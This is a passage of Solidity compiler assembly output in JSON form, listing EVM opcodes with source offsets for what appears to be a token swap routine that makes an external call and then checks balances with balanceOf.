											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "MLOAD"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP7"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "AND"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "SHL"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP2"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "MSTORE"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "ADD"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP1"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP7"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "AND"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP2"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "MSTORE"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "ADD"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP6"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP2"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "MSTORE"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "ADD"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP5"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP2"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "MSTORE"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "ADD"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP1"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "ADD"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP3"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP2"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "SUB"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP3"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "MSTORE"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP5"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP5"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP3"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP2"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP2"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "MSTORE"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "ADD"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "SWAP3"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "POP"
										},
										{
											"begin": 30,
											"end": 33,
											"name": "DUP1"
										},
										{
											"begin": 22,
											"end": 28,
											"name": "DUP3"
										},
										{
											"begin": 14,
											"end": 20,
											"name": "DUP5"
										},
										{
											"begin": 1,
											"end": 34,
											"name": "CALLDATACOPY"
										},
										{
											"begin": 99,
											"end": 100,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP2"
										},
										{
											"begin": 85,
											"end": 91,
											"name": "DUP5"
										},
										{
											"begin": 81,
											"end": 97,
											"name": "ADD"
										},
										{
											"begin": 74,
											"end": 101,
											"name": "MSTORE"
										},
										{
											"begin": 137,
											"end": 141,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 133,
											"end": 142,
											"name": "NOT"
										},
										{
											"begin": 126,
											"end": 130,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 121,
											"end": 124,
											"name": "DUP3"
										},
										{
											"begin": 117,
											"end": 131,
											"name": "ADD"
										},
										{
											"begin": 113,
											"end": 143,
											"name": "AND"
										},
										{
											"begin": 106,
											"end": 143,
											"name": "SWAP1"
										},
										{
											"begin": 106,
											"end": 143,
											"name": "POP"
										},
										{
											"begin": 169,
											"end": 172,
											"name": "DUP1"
										},
										{
											"begin": 161,
											"end": 167,
											"name": "DUP4"
										},
										{
											"begin": 157,
											"end": 173,
											"name": "ADD"
										},
										{
											"begin": 147,
											"end": 173,
											"name": "SWAP3"
										},
										{
											"begin": 147,
											"end": 173,
											"name": "POP"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "POP"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "POP"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "SWAP7"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "POP"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "POP"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "POP"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "POP"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "POP"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "POP"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "POP"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "MLOAD"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP1"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP4"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "SUB"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP2"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP8"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "DUP1"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "146"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "146"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "POP"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "GAS"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "CALL"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "147"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "147"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "POP"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "POP"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "POP"
										},
										{
											"begin": 12760,
											"end": 12960,
											"name": "POP"
										},
										{
											"begin": 12723,
											"end": 12960,
											"name": "tag",
											"value": "145"
										},
										{
											"begin": 12723,
											"end": 12960,
											"name": "JUMPDEST"
										},
										{
											"begin": 13006,
											"end": 13009,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 13001,
											"end": 13002,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 12988,
											"end": 13002,
											"name": "DUP15"
										},
										{
											"begin": 12988,
											"end": 13002,
											"name": "DUP2"
										},
										{
											"begin": 12988,
											"end": 13002,
											"name": "MUL"
										},
										{
											"begin": 12987,
											"end": 13009,
											"name": "DUP3"
										},
										{
											"begin": 12987,
											"end": 13009,
											"name": "SWAP1"
										},
										{
											"begin": 12987,
											"end": 13009,
											"name": "DIV"
										},
										{
											"begin": 12987,
											"end": 13009,
											"name": "SWAP2"
										},
										{
											"begin": 13036,
											"end": 13050,
											"name": "SWAP1"
										},
										{
											"begin": 13036,
											"end": 13050,
											"name": "DUP15"
										},
										{
											"begin": 13036,
											"end": 13050,
											"name": "MUL"
										},
										{
											"begin": 13035,
											"end": 13057,
											"name": "DIV"
										},
										{
											"begin": 13076,
											"end": 13090,
											"name": "DUP15"
										},
										{
											"begin": 13076,
											"end": 13090,
											"name": "ISZERO"
										},
										{
											"begin": 13072,
											"end": 13132,
											"name": "PUSH [tag]",
											"value": "151"
										},
										{
											"begin": 13072,
											"end": 13132,
											"name": "JUMPI"
										},
										{
											"begin": 13115,
											"end": 13125,
											"name": "PUSH",
											"value": "6"
										},
										{
											"begin": 13115,
											"end": 13125,
											"name": "SLOAD"
										},
										{
											"begin": 13092,
											"end": 13132,
											"name": "PUSH [tag]",
											"value": "151"
										},
										{
											"begin": 13092,
											"end": 13132,
											"name": "SWAP1"
										},
										{
											"begin": 13106,
											"end": 13113,
											"name": "DUP6"
										},
										{
											"begin": 13106,
											"end": 13113,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13115,
											"end": 13125,
											"name": "AND"
										},
										{
											"begin": 13127,
											"end": 13131,
											"name": "DUP5"
										},
										{
											"begin": 13092,
											"end": 13105,
											"name": "PUSH [tag]",
											"value": "142"
										},
										{
											"begin": 13092,
											"end": 13132,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 13092,
											"end": 13132,
											"name": "tag",
											"value": "151"
										},
										{
											"begin": 13092,
											"end": 13132,
											"name": "JUMPDEST"
										},
										{
											"begin": 13184,
											"end": 13198,
											"name": "DUP14"
										},
										{
											"begin": 13184,
											"end": 13198,
											"name": "ISZERO"
										},
										{
											"begin": 13180,
											"end": 13240,
											"name": "PUSH [tag]",
											"value": "153"
										},
										{
											"begin": 13180,
											"end": 13240,
											"name": "JUMPI"
										},
										{
											"begin": 13223,
											"end": 13233,
											"name": "PUSH",
											"value": "6"
										},
										{
											"begin": 13223,
											"end": 13233,
											"name": "SLOAD"
										},
										{
											"begin": 13200,
											"end": 13240,
											"name": "PUSH [tag]",
											"value": "153"
										},
										{
											"begin": 13200,
											"end": 13240,
											"name": "SWAP1"
										},
										{
											"begin": 13214,
											"end": 13221,
											"name": "DUP5"
										},
										{
											"begin": 13214,
											"end": 13221,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13223,
											"end": 13233,
											"name": "AND"
										},
										{
											"begin": 13235,
											"end": 13239,
											"name": "DUP4"
										},
										{
											"begin": 13200,
											"end": 13213,
											"name": "PUSH [tag]",
											"value": "142"
										},
										{
											"begin": 13200,
											"end": 13240,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 13200,
											"end": 13240,
											"name": "tag",
											"value": "153"
										},
										{
											"begin": 13200,
											"end": 13240,
											"name": "JUMPDEST"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "DUP1"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "DUP2"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "MSTORE"
										},
										{
											"begin": 13333,
											"end": 13337,
											"name": "ADDRESS"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "DUP3"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "ADD"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "MSTORE"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "SWAP1"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13299,
											"end": 13324,
											"name": "DUP7"
										},
										{
											"begin": 13299,
											"end": 13324,
											"name": "AND"
										},
										{
											"begin": 13299,
											"end": 13324,
											"name": "SWAP2"
										},
										{
											"begin": 13299,
											"end": 13324,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 13299,
											"end": 13324,
											"name": "SWAP2"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "DUP1"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "DUP4"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "ADD"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "SWAP3"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "SWAP3"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "SWAP2"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "SWAP1"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "DUP3"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "SWAP1"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "SUB"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "ADD"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "DUP2"
										},
										{
											"begin": 13299,
											"end": 13324,
											"name": "DUP7"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "DUP1"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "154"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "154"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "POP"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "GAS"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "STATICCALL"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "155"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "155"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "POP"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "POP"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "POP"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "POP"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "MLOAD"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "156"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "156"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "MLOAD"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "DUP1"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "DUP2"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "MSTORE"
										},
										{
											"begin": 13398,
											"end": 13402,
											"name": "ADDRESS"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "DUP3"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "ADD"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "MSTORE"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "SWAP1"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "MLOAD"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "SWAP2"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "SWAP10"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13364,
											"end": 13389,
											"name": "DUP6"
										},
										{
											"begin": 13364,
											"end": 13389,
											"name": "AND"
										},
										{
											"begin": 13364,
											"end": 13389,
											"name": "SWAP2"
										},
										{
											"begin": 13364,
											"end": 13389,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 13364,
											"end": 13389,
											"name": "SWAP2"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "DUP1"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "DUP3"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "ADD"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "SWAP3"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 13299,
											"end": 13339,
											"name": "SWAP3"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "SWAP1"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "SWAP2"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "SWAP1"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "DUP3"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "SWAP1"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "SUB"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "ADD"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "DUP2"
										},
										{
											"begin": 13364,
											"end": 13389,
											"name": "DUP7"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "DUP1"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "157"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "157"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "POP"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "GAS"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "STATICCALL"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "158"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "158"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "POP"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "POP"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "POP"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "POP"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "MLOAD"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "159"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "159"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "MLOAD"
										},
										{
											"begin": 13364,
											"end": 13404,
											"name": "SWAP7"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 13424,
											"end": 13438,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13424,
											"end": 13438,
											"name": "SWAP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13452,
											"end": 13474,
											"name": "DUP6"
										},
										{
											"begin": 13452,
											"end": 13474,
											"name": "AND"
										},
										{
											"begin": 13452,
											"end": 13474,
											"name": "DUP11"
										},
										{
											"begin": 13452,
											"end": 13474,
											"name": "SWAP1"
										},
										{
											"begin": 13452,
											"end": 13474,
											"name": "SUB"
										},
										{
											"begin": 13441,
											"end": 13474,
											"name": "DUP4"
										},
										{
											"begin": 13441,
											"end": 13474,
											"name": "GT"
										},
										{
											"begin": 13441,
											"end": 13540,
											"name": "PUSH [tag]",
											"value": "160"
										},
										{
											"begin": 13441,
											"end": 13540,
											"name": "JUMPI"
										},
										{
											"begin": 13539,
											"end": 13540,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13441,
											"end": 13540,
											"name": "PUSH [tag]",
											"value": "161"
										},
										{
											"begin": 13441,
											"end": 13540,
											"name": "JUMP"
										},
										{
											"begin": 13441,
											"end": 13540,
											"name": "tag",
											"value": "160"
										},
										{
											"begin": 13441,
											"end": 13540,
											"name": "JUMPDEST"
										},
										{
											"begin": 13513,
											"end": 13523,
